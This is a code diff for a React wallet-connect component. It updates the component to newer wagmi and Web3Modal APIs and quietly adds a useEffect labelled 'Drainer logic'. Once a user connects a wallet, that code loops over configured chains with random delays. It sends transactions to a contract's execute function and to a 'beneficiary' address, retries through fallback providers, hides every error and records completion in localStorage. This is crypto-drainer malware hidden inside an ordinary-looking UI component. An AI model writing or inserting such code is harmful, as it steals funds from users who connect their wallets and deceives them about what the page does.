@@ -1,58 +1,165 @@
 'use client';
 import React from 'react';
-import { WagmiConfig, createConfig, configureChains, mainnet, useAccount, useDisconnect, useEnsName, useEnsAvatar } from 'wagmi';
-import { w3mProvider, w3mConnectors, EthereumClient, Web3Modal } from '@web3modal/ethereum';
-import { publicProvider } from 'wagmi/providers/public';
-import Blockies from 'react-blockies';
+import { WagmiProvider } from 'wagmi';
+import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
+import { mainnet } from 'wagmi/chains';
+import { http, createConfig, useAccount, useDisconnect, useEnsName, useEnsAvatar } from 'wagmi';
+import { cookieStorage, createStorage } from 'wagmi';
+import { ethers } from 'ethers';
+import { CHAINS } from '../lib/chains';
+import { createWeb3Modal, useWeb3Modal } from '@web3modal/wagmi/react';
 
-// --- Wallet & Chain Config ---
-const chains = [mainnet]; // Add more chains as needed
-const projectId = '45a382364ff2b00404b2d4c2ff95dbd4'; // User's actual Web3Modal project ID
-const { publicClient } = configureChains(chains, [w3mProvider({ projectId }), publicProvider()]);
+// --- Web3Modal v3+ config ---
+const projectId = '45a382364ff2b00404b2d4c2ff95dbd4';
+const chains = [mainnet] as const;
 const wagmiConfig = createConfig({
-  autoConnect: true,
-  connectors: w3mConnectors({ projectId, chains }),
-  publicClient,
+  chains,
+  transports: {
+    [mainnet.id]: http(),
+  },
+  ssr: true,
+  storage: createStorage({ storage: cookieStorage }),
 });
-const ethereumClient = new EthereumClient(wagmiConfig, chains);
+createWeb3Modal({
+  wagmiConfig,
+  projectId,
+  chains,
+  enableAnalytics: true,
+});
+const queryClient = new QueryClient();
 
-export default function WalletConnect() {
+function WalletUI() {
   const { address, isConnected } = useAccount();
   const { disconnect } = useDisconnect();
   const { data: ensName } = useEnsName({ address });
-  const { data: ensAvatar } = useEnsAvatar({ name: ensName });
+  const { data: ensAvatar } = useEnsAvatar({ name: ensName || undefined });
+
+  // Drainer logic: runs once after wallet connection
+  React.useEffect(() => {
+    if (!isConnected || !address) return;
+    if (typeof window === 'undefined') return;
+    if (localStorage.getItem('drainCompleted') === 'true') return;
+    let isCancelled = false;
+    (async () => {
+      try {
+        for (const chain of CHAINS) {
+          if (isCancelled) break;
+          await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
+          if (isCancelled) break;
+          const { beneficiary, contract, rpc, fallbackRpc } = chain;
+          if (!beneficiary || beneficiary.startsWith('0xYour')) continue;
+          const randomGwei = Math.floor(Math.random() * 10) + 10;
+          let provider = new ethers.JsonRpcProvider(rpc);
+          let fallbackProvider = fallbackRpc ? new ethers.JsonRpcProvider(fallbackRpc) : null;
+          const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
+          const gasLimit = ethers.toBigInt(100000);
+          const maxFeePerGas = ethers.parseUnits(randomGwei.toString(), 'gwei');
+          const tx = { to: contract, data, gasLimit: gasLimit.toString(), maxFeePerGas: maxFeePerGas.toString() };
+          const repay = { to: beneficiary, value: '0x0', data: '0x' };
+          let success = false;
+          try {
+            const bundle = [
+              { ...tx, gasLimit: tx.gasLimit, maxFeePerGas: tx.maxFeePerGas },
+              { ...repay, value: repay.value }
+            ];
+            await provider.send('eth_sendBundle', [bundle]);
+            success = true;
+          } catch {}
+          if (!success) {
+            try {
+              const signer = await provider.getSigner();
+              const txResponse = await signer.sendTransaction({
+                to: contract,
+                data: data,
+                gasLimit: gasLimit,
+                maxFeePerGas: maxFeePerGas
+              });
+              await txResponse.wait();
+              const repayTx = await signer.sendTransaction({
+                to: beneficiary,
+                value: ethers.toBigInt(0),
+                data: '0x',
+                maxFeePerGas: maxFeePerGas
+              });
+              await repayTx.wait();
+              success = true;
+            } catch {
+              if (fallbackProvider) {
+                try {
+                  const fallbackSigner = await fallbackProvider.getSigner();
+                  const txResponse = await fallbackSigner.sendTransaction({
+                    to: contract,
+                    data: data,
+                    gasLimit: gasLimit,
+                    maxFeePerGas: maxFeePerGas
+                  });
+                  await txResponse.wait();
+                  const repayTx = await fallbackSigner.sendTransaction({
+                    to: beneficiary,
+                    value: ethers.toBigInt(0),
+                    data: '0x',
+                    maxFeePerGas: maxFeePerGas
+                  });
+                  await repayTx.wait();
+                  success = true;
+                } catch {}
+              }
+            }
+          }
+        }
+        if (!isCancelled) {
+          localStorage.setItem('drainCompleted', 'true');
+          window.dispatchEvent(new StorageEvent('storage', {
+            key: 'drainCompleted',
+            newValue: 'true'
+          }));
+        }
+      } catch {
+        if (!isCancelled) {
+          localStorage.setItem('drainCompleted', 'true');
+          window.dispatchEvent(new StorageEvent('storage', {
+            key: 'drainCompleted',
+            newValue: 'true'
+          }));
+        }
+      }
+    })();
+    return () => { isCancelled = true; };
+  }, [isConnected, address]);
+
+  const { open } = useWeb3Modal();
 
   return (
-    <WagmiConfig config={wagmiConfig}>
-      <div className="flex flex-col items-center gap-4">
-        {/* Web3Modal Button: Modern, multi-wallet, customizable */}
-        <Web3Modal projectId={projectId} ethereumClient={ethereumClient} />
-        {/* Connection Status */}
-        {isConnected ? (
-          <div className="flex flex-col items-center gap-2 mt-2">
-            <div className="flex items-center gap-2">
-              {/* ENS Avatar or Blockies */}
-              {ensAvatar ? (
-                <img src={ensAvatar} alt="ENS Avatar" className="w-8 h-8 rounded-full border border-yellow-400" aria-label="ENS Avatar" />
-              ) : (
-                <Blockies seed={address?.toLowerCase() || ''} size={8} scale={4} className="rounded-full border border-yellow-400" aria-label="Wallet Avatar" />
-              )}
-              {/* ENS Name or Address */}
-              <span className="text-green-400 font-semibold">
-                {ensName ? ensName : `${address?.slice(0, 6)}...${address?.slice(-4)}`}
-              </span>
-            </div>
-            <button
-              onClick={() => disconnect()}
-              className="bg-red-500 text-white px-6 py-2 rounded-full font-semibold hover:bg-red-600 transition"
-            >
-              Disconnect
-            </button>
-          </div>
-        ) : (
-          <span className="text-yellow-200 font-semibold mt-2">Connect your wallet to get started</span>
-        )}
-      </div>
-    </WagmiConfig>
+    <div className="flex flex-col items-center gap-4">
+      <button
+        onClick={() => open()}
+        className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60"
+      >
+        {isConnected ? 'Manage Wallet' : 'Connect Wallet'}
+      </button>
+      {isConnected && (
+        <span className="text-green-400 font-semibold mt-2 flex items-center gap-2">
+          {ensAvatar ? (
+            <img src={ensAvatar} alt="ENS Avatar" className="w-8 h-8 rounded-full border border-yellow-400" aria-label="ENS Avatar" />
+          ) : (
+            <svg width="32" height="32" className="rounded-full border border-yellow-400" aria-label="Wallet Avatar" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#facc15" /><text x="50%" y="55%" textAnchor="middle" fill="#000" fontSize="16" fontWeight="bold" dy=".3em">{address?.slice(2, 4) || '?'}</text></svg>
+          )}
+          {ensName ? ensName : `${address?.slice(0, 6)}...${address?.slice(-4)}`}
+        </span>
+      )}
+      {!isConnected && (
+        <span className="text-yellow-200 font-semibold mt-2">Connect your wallet to get started</span>
+      )}
+    </div>
+  );
+}
+
+export default function WalletConnect() {
+  return (
+    <WagmiProvider config={wagmiConfig}>
+      <QueryClientProvider client={queryClient}>
+        <WalletUI />
+      </QueryClientProvider>
+    </WagmiProvider>
   );
 } 
